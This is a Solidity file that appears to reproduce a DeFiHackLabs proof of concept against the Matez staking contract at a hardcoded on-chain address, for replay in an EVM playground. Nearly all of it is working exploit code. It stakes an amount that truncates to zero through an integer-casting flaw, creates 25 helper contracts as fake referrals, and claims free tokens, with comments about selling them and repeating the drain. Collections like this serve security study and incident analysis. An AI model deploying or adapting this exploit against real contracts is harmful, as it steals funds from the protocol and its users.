// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Matez_exp.sol test's testExploit() logic verbatim, but without inheriting
// forge-std Test/BaseTestWithBalanceLog (which depends on the Foundry cheatcode
// contract being deployed; that address has no code in a plain EVM replay, so
// any cheatcode-gated modifier reverts before the real attack logic runs).

address constant MATEZ_STAKING_PROG = 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa;

contract Matez {
    function testExploit() external {
        // due to the integer truncation problem, the following number will be truncated to 0,
        // This flaw allowed the attacker to transfer a zero amount of tokens while
        // being recognized by the contract as having staked a large amount.
        uint256 amount = 340282366920938463463374607431768211456;
        IMatez matez = IMatez(MATEZ_STAKING_PROG);

        // register current contract
        address sponsor = 0x80d93e9451A6830e9A531f15CCa42Cb0357D511f;
        matez.register(sponsor);
        matez.stake(amount);

        // create enough referrals to enable claim
        for (uint256 i = 0; i < 25; i++) {
            new AttackContract(address(this), amount);
        }

        // claim free MATEZ token and sell it later
        IMatez(MATEZ_STAKING_PROG).claim(uint40(3), uint40(1), 0);

        // keep repeat this process to get more MATEZ token for free
    }
}

contract AttackContract {
    constructor(address sponsor, uint256 amount) {
        IMatez matez = IMatez(MATEZ_STAKING_PROG);
        matez.register(sponsor);
        matez.stake(amount);
    }
}

interface IMatez {
    function register(address _sponsor) external;
    function stake(uint256 amnt) external;
    function claim(uint40 typ, uint40 pkgid, uint256 amount) external;
}
